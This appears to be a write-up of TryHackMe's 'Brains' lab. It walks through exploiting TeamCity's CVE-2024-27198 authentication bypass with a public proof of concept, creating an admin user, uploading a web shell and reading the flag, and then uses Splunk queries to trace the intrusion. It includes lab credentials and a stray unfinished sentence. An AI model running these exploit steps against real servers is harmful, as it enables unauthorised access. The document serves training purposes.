# Brains Walkthrough
<br/>
Welcome to the Lookup challenge, here is the link to the [room](https://tryhackme.com/room/brains) on TryHackMe.

This challenge is divided into 2 parts: in the first one we will be part or the red team and we'll hack into the target to get the flag.

In the second part we will be forsensic analysts and with Splunk we are gonna be investigate and identify the footprints left by the attacker.

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge

### Red
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP brains.thm" | sudo tee -a /etc/hosts
```

Now we scan for open ports with *nmap*:
```bash
nmap -sV -sC brains.thm
```

We find 4 open ports:
```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:1f:75:5b:91:0b:80:fa:e0:9c:5e:f0:15:69:ab:1e (RSA)
|   256 85:cf:c6:87:e9:2a:77:44:97:b8:15:0f:e6:55:a9:2d (ECDSA)
|_  256 7b:3e:cc:34:fe:6e:21:17:c5:b2:81:3d:44:f5:20:54 (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Maintenance
8089/tcp  open  ssl/http Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2024-07-04T21:42:22
|_Not valid after:  2027-07-04T21:42:22
|_http-server-header: Splunkd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/xml; charset=UTF-8).
50000/tcp open  http     Apache Tomcat (language: en)
|_http-title: TeamCity Maintenance &mdash; TeamCity
| http-methods: 
|_  Potentially risky methods: TRACE
```

First we check port 80, visiting `http://brains.thm/` shows that the server is under maintenance.
Now looking on `http://brains.thm:50000` we get redirected to this login page `http://brains.thm:50000/login.html`.

We see the TeamCity software Version 2023.11.3
This particular version has an authentication bypass vulnerability, we can also see a POC [here](https://github.com/W01fh4cker/CVE-2024-27198-RCE/blob/main/CVE-2024-27198-RCE.py).
Download it (check what you are downloading before running :) ).
Let's set it up
```bash
python3 -m venv venv
source venv/bin/activate
```

Install modules:
```
pip install requests urllib3 faker
```

Run it:
```bash
python exploit.py -t http://brains.thm:50000 --behinder4
```

It will generate for you some valid credentials and upload a web shell, you should get a message like this:
```
User added successfully, username: epifsa7r, password: V0O3WrGRo0, 
Webshell url: http://brains.thm:50000/plugins/salZ79Jk/salZ79Jk.jsp
X-TC-CSRF-Token: 9e780cd1-5351-4b87-8a54-9020d4423e82
Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.ZXhDRVdUSkhXRXlrYmR4UmVtcW5FWHpwU3RZ.OGIzZTI5ZmQtNjIwOC00NmZhLTg0NDQtNGUxMjQ1MGI1YmZl
```

I got a shell but i was not able to read 

It will also give you a shell as the `ubuntu` user, now we can read the flag.txt file located in the home directory:
```bash
cat /home/ubuntu/flag.txt
```
--> REDACTED

<br/>

### Blue
Start the second machine.
Connect to the Splunk instance by navigating to: `http://MACHINE_IP:8000` and login with the credentials: `splunk:analyst123`.

Reached the search page we need to change  the time-span to display on the top right, we want to set it as "all time", next we can load all the logs by sending the query `index=*`, we find about 4k events.

Let's start our investigation!

Looking at the indexes we can see that we have 3:
- main
- auth_logs
- weblogs

The first question ask us to find the name of the backdoor user that was created after exploitation.
We can check the auth logs, with keywords like `new` or `useradd`:
```
index="auth_logs" new 
```

Or either select the field "name", on the left side we click on it and it shows 4 usernames, one clearly stands out:
--> REDACTED

We know that the attacker installed the malicious package, we can filter for installations:
```
index=main install
```

And we find one that is very suspect: REDACTED

Finally the hacker has installed a plugin on the website, we can find the name with:
```
index=weblogs plugin
```
--> REDACTED


> [!NOTE] Note
> In a real scenario we would not stop our search on an item only because look "suspect", we would also need to correlate those events, build a timeline and confirm that for example the installed package and the plugin are actually malicious.

<br/>
<br/>

## Conclusion
Congratulations you have successfully took both the perspective of the attacker and the defender/investigator, you have managed to both exploit the target ad invetigate the malicious tracks.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
